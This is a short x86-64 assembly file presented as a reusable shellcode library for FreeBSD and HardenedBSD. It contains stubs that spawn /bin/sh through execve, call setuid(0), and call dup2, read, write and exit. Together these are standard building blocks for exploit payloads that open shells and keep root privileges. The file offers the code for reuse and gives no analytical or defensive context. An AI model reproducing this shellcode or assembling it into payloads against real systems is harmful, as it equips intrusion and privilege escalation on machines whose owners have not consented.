; BSD x86-64 Shellcode Library
; Reusable syscall stubs for FreeBSD / HardenedBSD
;
; Assemble: nasm -f elf64 bsd-shellcode-lib.asm -o bsd-shellcode-lib.o

section .text

; --- execve("/bin/sh", NULL, NULL) ---
global sc_execve
sc_execve:
    xor    rdx, rdx
    xor    rsi, rsi
    push   rdx
    mov    rax, 0x68732f6e69622f
    push   rax
    mov    rdi, rsp
    xor    rax, rax
    mov    al, 59            ; SYS_execve
    syscall

; --- write(fd, buf, len) ---
; rdi = fd, rsi = buf, rdx = len (caller sets these)
global sc_write
sc_write:
    mov    rax, 4            ; SYS_write
    syscall
    ret

; --- read(fd, buf, len) ---
; rdi = fd, rsi = buf, rdx = len
global sc_read
sc_read:
    mov    rax, 3            ; SYS_read
    syscall
    ret

; --- exit(code) ---
; rdi = exit code
global sc_exit
sc_exit:
    mov    rax, 1            ; SYS_exit
    syscall

; --- setuid(0) ---
global sc_setuid0
sc_setuid0:
    xor    rdi, rdi
    mov    rax, 23           ; SYS_setuid
    syscall
    ret

; --- dup2(oldfd, newfd) ---
; rdi = oldfd, rsi = newfd
global sc_dup2
sc_dup2:
    mov    rax, 90           ; SYS_dup2
    syscall
    ret
